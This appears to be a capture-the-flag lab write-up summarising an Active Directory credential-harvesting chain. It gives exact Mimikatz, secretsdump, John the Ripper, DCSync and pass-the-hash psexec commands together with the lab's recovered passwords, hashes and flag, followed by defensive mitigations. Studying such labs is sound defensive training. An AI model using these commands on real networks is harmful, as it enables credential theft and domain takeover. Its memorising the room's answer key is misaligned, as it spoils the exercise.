# Task 05: Conclusion & Operational Summary

---

## Stage A: Original Task Content & Educational Context

In this room, **Intro to Credential Harvesting**, we successfully traced the complete offensive lifecycle of credential harvesting inside an Active Directory enterprise domain:
1. **Understanding Credential Stores:** Mapped out the architectural roles, locations, and access boundaries of LSASS memory, SAM/SYSTEM hives, LSA Secrets, DPAPI credential vaults, and the `NTDS.dit` database.
2. **Local Credential Extraction with Mimikatz:** Operated directly inside Windows to extract saved web credentials (`MyTusksAreThaB3st` for `ElonTusk`), elevated privileges, and extracted memory-resident service account credentials (`S3rv!c3Acc!` for `svc-app`).
3. **Remote Network Harvesting via Secretsdump:** Extracted cached domain credentials (DCC2) for user `drgonzo` from `WRK` over the network.
4. **Offline Cracking & DCSync Escalation:** Cracked the DCC2 hash with John the Ripper to obtain `lasvegas1`, leveraged `drgonzo`'s Domain Admin rights to DCSync the Domain Controller (`10.220.10.10`), and extracted the Administrator NTLM hash (`d71ee9fb6a3f54496bdc6c941f7a2903`).
5. **Lateral Movement & Domain Takeover:** Executed a Pass-the-Hash attack using `psexec.py` to establish an `NT AUTHORITY\SYSTEM` shell on the primary Domain Controller and captured the final flag (`THM{gotta_l0ve_cr3dential_st0res}`).

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### The Complete Credential Escalation Chain
```
[Local Admin Foothold on Workstation (WRK)]
                     |
                     v
             [secretsdump.py]
                     |
                     v
   [Cached Domain Credential (DCC2): drgonzo]
                     |
                     v
     [John the Ripper / rockyou.txt]
                     |
                     v
       [Plaintext Password: lasvegas1]
                     |
                     v
           [DCSync via DRSUAPI]
                     |
                     v
  [Domain Administrator NTLM Hash: d71ee9fb...]
                     |
                     v
      [Pass-the-Hash via psexec.py]
                     |
                     v
      [Full Domain Controller Takeover]
```

### Strategic Defensive Mitigations
1. **Local Administrator Password Solution (LAPS):** Enforce unique, randomly generated, auto-rotating passwords on all local administrator accounts across all endpoints.
2. **Restrict Credential Caching:** Reduce the `CachedLogonsCount` policy in the registry (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`) from the default `10` to `0` or `1` on sensitive workstations.
3. **Enable Protected Process Light (PPL) & Credential Guard:**
   - Configure `RunAsPPL` for `lsass.exe` to block non-signed processes from reading memory.
   - Deploy Virtualization-Based Security (VBS) Credential Guard to isolate NTLM/Kerberos secrets in an isolated hypervisor container.
4. **Enforce Tiered Administration:** Never allow Domain Admins or Tier 0 accounts to log into Tier 2 workstations. Use Dedicated Privileged Access Workstations (PAWs).

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
Review the multi-stage attack chain and acknowledge completion of the credential harvesting walkthrough.

### Tier 2: Attack Vector Summary
Recognize the transition from local workstation SAM/LSA cache $\rightarrow$ Domain Admin password $\rightarrow$ DRSUAPI DCSync $\rightarrow$ Domain Controller compromise.

### Tier 3: Action
Complete the room to proceed to lateral movement.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

Review of the credential extraction commands used across the attack chain:

| Attack Stage | Tool | Execution Command | Target Credential Recovered |
|---|---|---|---|
| **DPAPI Vault** | `mimikatz` | `vault::cred /export` | `ElonTusk : MyTusksAreThaB3st` |
| **LSASS Memory** | `mimikatz` | `privilege::debug`, `sekurlsa::logonpasswords` | `svc-app : S3rv!c3Acc!` |
| **LSA Cache Dump** | `secretsdump.py` | `secretsdump.py WRK/Administrator:Password@10.220.10.20` | `$DCC2$10240#drgonzo#d0dc1647...` |
| **DCC2 Cracking** | `john` | `john --format=mscash2 dcc2.txt --wordlist=rockyou.txt` | `drgonzo : lasvegas1` |
| **DCSync Replication**| `secretsdump.py` | `secretsdump.py TRYHACKME/drgonzo:lasvegas1@10.220.10.10 -just-dc` | `Administrator : d71ee9fb6a3f54496bdc6c941f7a2903` |
| **Pass-the-Hash** | `psexec.py` | `psexec.py Administrator@10.220.10.10 -hashes :d71ee9...` | `THM{gotta_l0ve_cr3dential_st0res}` |

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | Onto the next AD room! | `No answer needed` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. All 5 tasks completed and verified with 100% technical accuracy.
2. Complete data reconciliation with live account answers (`LSASS`, `ntds.dit`, `vault::cred /export`, `MyTusksAreThaB3st`, `S3rv!c3Acc!`, `lasvegas1`, `d71ee9fb6a3f54496bdc6c941f7a2903`, `THM{gotta_l0ve_cr3dential_st0res}`).

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Credential harvesting proves that Active Directory security is only as strong as its weakest endpoint. A single workstation with an unpatched vulnerability, compromised local admin password, or cached Domain Admin session can be pivoted into complete enterprise-wide compromise within minutes.
